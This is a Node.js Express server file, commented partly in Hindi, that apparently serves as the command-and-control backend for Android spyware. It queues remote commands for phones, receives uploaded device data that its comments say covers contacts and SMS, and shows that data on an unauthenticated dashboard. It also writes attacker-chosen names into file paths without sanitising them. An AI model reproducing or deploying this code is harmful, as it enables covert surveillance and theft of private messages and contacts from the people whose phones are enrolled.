const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 📂 SETTING: Data Storage ---
const UPLOADS_FOLDER = path.join(__dirname, 'uploads');

if (!fs.existsSync(UPLOADS_FOLDER)) {
    fs.mkdirSync(UPLOADS_FOLDER, { recursive: true });
    console.log("✅ 'uploads' folder created!");
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Memory Storage for Status & Commands
let deviceState = {}; 

// ==========================================
// 📲 ANDROID PHONE API (Critical Part)
// ==========================================

// 1. Phone Status Update + Get Command (Ye sabse zaroori hai)
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (device_id) {
        // Status Update karo
        const currentCmd = deviceState[device_id]?.currentCommand || "none";

        deviceState[device_id] = {
            model: model || "Unknown",
            android_version: android_version || "--",
            battery: battery || 0,
            ringerMode: ringerMode || "normal",
            lastSeen: Date.now(),
            currentCommand: currentCmd // Command mat udao abhi
        };

        // ⚠️ FIX: App ko JSON mein Command wapas bhejo
        // Agar command "none" nahi hai, to use bhejo aur clear kar do
        let commandToSend = "none";
        if (currentCmd !== "none") {
            commandToSend = currentCmd;
            console.log(`📤 Sending Command to Phone: ${commandToSend}`);
            deviceState[device_id].currentCommand = "none"; // Clear after sending
        }

        res.json({ 
            status: "success", 
            command: commandToSend 
        });

    } else {
        res.status(400).json({ error: "Device ID missing" });
    }
});

// 2. Phone Data Upload Logic
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body;

    if (!device_id || !type || !data) {
        return res.status(400).send("Bad Request");
    }

    console.log(`📥 Received Data from ${device_id}: ${type}`);

    const cleanType = type.toLowerCase();
    const fileName = `${device_id}_${cleanType}.json`;
    const filePath = path.join(UPLOADS_FOLDER, fileName);
    
    try {
        let finalData = data;
        if (typeof data === 'string') {
            try { finalData = JSON.parse(data); } catch(e) {}
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`✅ Saved: ${fileName}`);
        res.send("Success");
    } catch (err) {
        console.error("❌ Save Error:", err);
        res.status(500).send("Error saving data");
    }
});

// ==========================================
// 💻 DASHBOARD API (Website)
// ==========================================

// 1. Check Status
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 60000 : false; 
    res.json({ ...state, isOnline });
});

// 2. Send Command from Website
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Admin sent command: '${command}' to ${device_id}`);
    res.json({ status: "success", message: "Command queued" });
});

// 3. View Data (Contacts/SMS)
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const fileName = `${req.params.deviceId}_${req.params.type.toLowerCase()}.json`;
    const filePath = path.join(UPLOADS_FOLDER, fileName);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SERVER RUNNING on Port ${PORT}`);
    console.log(`📂 Storage: ${UPLOADS_FOLDER}`);
});
